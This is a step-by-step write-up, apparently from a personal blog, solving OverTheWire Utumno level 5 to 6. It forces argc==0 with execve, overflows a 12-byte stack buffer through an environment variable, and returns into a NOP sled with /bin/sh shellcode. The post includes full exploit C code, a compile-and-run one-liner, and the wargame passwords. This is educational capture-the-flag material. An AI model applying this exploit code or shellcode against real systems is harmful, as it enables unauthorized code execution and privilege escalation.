---
date: 2023-09-13 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 5 → 6 tutorial!!"
permalink: /posts/overTheWire-Utumno-Level-5-to-6/
tags: [overthewire, utumno, pwn, argc0, envp, strcpy, strncpy, buffer-overflow, shellcode, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 5 → 6!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-4-to-5/' | relative_url }}">← Previous: Level 4 → 5</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno6.html" target="_blank" rel="noopener">Official (Level 6) ↗</a>
  </div>
  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Utumno-Level-6-to-7/' | relative_url }}">Next: Level 6 → 7 →</a>
  </div>
</nav>

## Login

Use the password from **Level 4 → 5**:

```bash
ssh utumno5@utumno.labs.overthewire.org -p 2227
# password: woucaejiek
````

Then move to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno5`**

* The program only proceeds if **`argc == 0`** (like earlier levels); otherwise it prints a message then exits.
* When `argc==0`, it **prints one environment variable** (the 10th slot) via `printf("Here we go - %s\n", envp[9])` and then calls `hihi(envp[9])`.
* In `hihi`, it copies the string into a **12-byte local buffer**:

  * If `strlen(s) > 0x13` (19), it uses `strncpy(dst, s, 0x14)` (20 bytes) → overflow.
  * Otherwise it uses `strcpy(dst, s)` → overflow when `len > 12`.

**Goal:** Force `argc==0`, ensure enough environment variables, then overflow the stack via the printed env var to **control EIP** and **return into a NOP sled + shellcode** stored in another env var.

---

## Source Code (Disassembly Excerpt)

`main` (relevant parts):

```asm
cmp  [ebp+0x8], 0x0          ; argc == 0 ?
je   ok_path
push msg                     ; else: puts + exit(1)
call puts
push 1
call exit

ok_path:
mov  eax, [ebp+0xc]          ; eax = envp
add  eax, 0x28               ; envp + 10*4 bytes
mov  eax, [eax]              ; eax = envp[9]
push eax
push fmt("Here we go - %s\n")
call printf
...
push eax                     ; hihi(envp[9])
call hihi
```

`hihi`:

```asm
sub  esp, 0xc                ; 12-byte local buffer
push [ebp+0x8]
call strlen
cmp  eax, 0x13               ; > 19 ?
jbe  short_use_strcpy
push 0x14                    ; 20 bytes (!)
push [ebp+0x8]
lea  eax, [ebp-0xc]          ; 12-byte dst
push eax
call strncpy                 ; overflow
jmp  done

short_use_strcpy:
push [ebp+0x8]
lea  eax, [ebp-0xc]
push eax
call strcpy                  ; overflow if len > 12

done:
leave
ret
```

---

## Exploitation Steps

### 1) Force `argc == 0`

A tiny launcher using `execve("/utumno/utumno5", NULL, envp)`:

```c
// code.c
#include <unistd.h>
int main(void){
    execve("/utumno/utumno5", NULL, NULL);
    return 0;
}
```

This **segfaults** because `printf` expects `envp[9]`. So give it enough env vars:

```c
#include <unistd.h>
int main(void){
    char *envp[] = {"A","B","C","D","E","F","G","H","I","J","K","L", NULL};
    execve("/utumno/utumno5", NULL, envp);
}
```

Now you’ll see:

```
Here we go - J
```

### 2) Prove the overflow using the printed env slot

Overflow the **10th env var** (index 9) to hit saved EIP:

```c
#include <unistd.h>
int main(void){
    char *envp[] = {"","","","","","","","","",
        "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII", NULL};
    execve("/utumno/utumno5", NULL, envp);
}
```

Running under a tracer shows:

```
... SIGSEGV si_addr=0x45454545  (# 'E')
```

So EIP lands on the `'E'`s—overflow confirmed.

### 3) Stage shellcode in a separate env var + pick a RET

Put a **NOP sled + `/bin//sh` shellcode** in **envp\[8]**, and use **envp\[9]** for the overflow + RET:

```c
#include <unistd.h>
int main(void){
    char *envp[] = {
        "","","","","","","","",
        /* envp[8]: sled + shellcode */
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90"
        "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
        /* envp[9]: overflow + RET (to sled) */
        "AAAABBBBCCCCDDDD\x8c\xdf\xff\xff",
        NULL
    };
    execve("/utumno/utumno5", NULL, envp);
}
```

Find an address **inside the sled** (example from gdb dump):

```
0xffffdf8c: 0x90909090 0x90909090 ...
```

So use **RET = `0xffffdf8c` → `\x8c\xdf\xff\xff`** appended after `...DDDD`.

### 4) Pop a shell & read the password

```bash
gcc -m32 code.c -o code
./code
$ whoami
utumno6
$ cat /etc/utumno_pass/utumno6
eiluquieth
```

---

## Password

From my run:

```
eiluquieth
```

---

## Quick One-liner

```bash
cat > /tmp/u5.c <<'EOF'
#include <unistd.h>
int main(void){
  char *envp[] = {
    "","","","","","","","",
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90"
    "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
    "AAAABBBBCCCCDDDD\x8c\xdf\xff\xff",
    NULL
  };
  execve("/utumno/utumno5", NULL, envp);
  return 0;
}
EOF
gcc -m32 /tmp/u5.c -o /tmp/u5 && /tmp/u5 && whoami && cat /etc/utumno_pass/utumno6
```

---

## Troubleshooting

* **Still exits immediately?** You didn’t force `argc==0`. Launch via `execve` with **`argv = NULL`**.
* **Segfault before printing?** Provide at least **10 env vars** so `printf("Here we go - %s", envp[9])` has a valid pointer.
* **RET not hit / wrong offset?** Keep the overflow in **envp\[9]** and verify with a marker (`EEEEs` → `0x45454545` in EIP).
* **Shellcode doesn’t run?**

  * Confirm the **RET points inside the sled** (dump stack with gdb and pick a stable address).
  * Add more NOPs for jitter tolerance; ensure **little-endian** RET bytes.
  * Avoid null bytes in the overflow string before RET.

---

**Congrats 🎉** You combined the **argc==0 trick** with an **env-driven stack overflow** to hijack control flow and jump into a sled + shellcode. Onward to **Level 6 → 7**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
